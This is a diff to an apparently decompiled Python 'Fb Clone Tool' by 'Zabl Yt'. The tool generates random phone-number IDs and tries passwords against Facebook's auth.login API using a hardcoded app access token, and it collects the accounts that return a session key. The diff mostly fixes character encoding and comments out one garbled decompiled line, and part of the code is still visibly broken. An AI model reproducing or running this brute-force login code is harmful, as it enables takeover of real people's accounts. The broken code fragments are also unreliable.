@@ -128,7 +128,7 @@ github = 'github.com/Hackin6060'
 yt = 'https://youtube.com/@mrxidi7152'
 web = 'https://youtube.com/@mrxidi7152'
 author = 'Zabl Yt'
-sys.stdout.write('\x1b]2;<ðŸ’šZABL YTðŸ’š>\x07')
+sys.stdout.write('\x1b]2;<💚ZABL YT💚>\x07')
 
 def clear():
     os.system('clear')
@@ -290,7 +290,7 @@ def ua():
         C,
         D])
 
-logo = f'''\n .d8b.  d88888D  .d8b.  d8888b. db      \nd8\' `8b YP  d8\' d8\' `8b 88  `8D 88     \x1b[38;5;196m P\x1b[1;97m\n88ooo88    d8\'  88ooo88 88oooY\' 88 \x1b[38;5;46m     R \x1b[1;97m\n88~~~88   d8\'   88~~~88 88~~~b. 88     \x1b[38;5;14m O\x1b[1;97m\n88   88  d8\' db 88   88 88   8D 88booo. \nYP   YP d88888P YP   YP Y8888P\' Y88888P \n{'--------------------------------------------------'}\n[+] Tool Version     :   2.0.0\n[+] Tool Author      :   {author}\n[+] Tool Type        :   Cloning Tool\n[+] Premium Member   :   Premium {rc}ãŠ…{s}\n{'--------------------------------------------------'}\n{lg}MY KEY : {MY_KEY}{s}\n{'--------------------------------------------------'}\n[+] Date Format      :   {aajdate}\n[+] Update Format    :   {rg}2024-09-01{s}\n[+] Welcome          :   Fb Clone Tool\n{'--------------------------------------------------'}'''
+logo = f'''\n .d8b.  d88888D  .d8b.  d8888b. db      \nd8\' `8b YP  d8\' d8\' `8b 88  `8D 88     \x1b[38;5;196m P\x1b[1;97m\n88ooo88    d8\'  88ooo88 88oooY\' 88 \x1b[38;5;46m     R \x1b[1;97m\n88~~~88   d8\'   88~~~88 88~~~b. 88     \x1b[38;5;14m O\x1b[1;97m\n88   88  d8\' db 88   88 88   8D 88booo. \nYP   YP d88888P YP   YP Y8888P\' Y88888P \n{'--------------------------------------------------'}\n[+] Tool Version     :   2.0.0\n[+] Tool Author      :   {author}\n[+] Tool Type        :   Cloning Tool\n[+] Premium Member   :   Premium {rc}㊅{s}\n{'--------------------------------------------------'}\n{lg}MY KEY : {MY_KEY}{s}\n{'--------------------------------------------------'}\n[+] Date Format      :   {aajdate}\n[+] Update Format    :   {rg}2024-09-01{s}\n[+] Welcome          :   Fb Clone Tool\n{'--------------------------------------------------'}'''
 
 def caseher():
     os.system('clear')
@@ -413,7 +413,7 @@ def number_cloning():
     print('\x1b[0mFor Example :\x1b[0m 2000,4000,6000 ...')
     limit = int(input('\x1b[0mIdz Limit : \x1b[0m'))
     for nmbr in range(limit):
-        nmp = (lambda .0: for _ in .0:
+        #nmp = (lambda .0: for _ in .0:
 random.choice(string.digits)None)(range(7)())
         xoo = kode + nmp.replace(' ', '')
         xdr = f'''{kode + nmp}|{nmp} {xoo}\n'''
@@ -769,7 +769,7 @@ def login(uid):
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
     'viewport-width': '980',
 }
-        rp = Session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20Â¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = headers).json()
+        rp = Session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = headers).json()
         if 'session_key' in rp:
             cps.append(uid)
         if 'www.facebook.com' in rp['error_msg']:
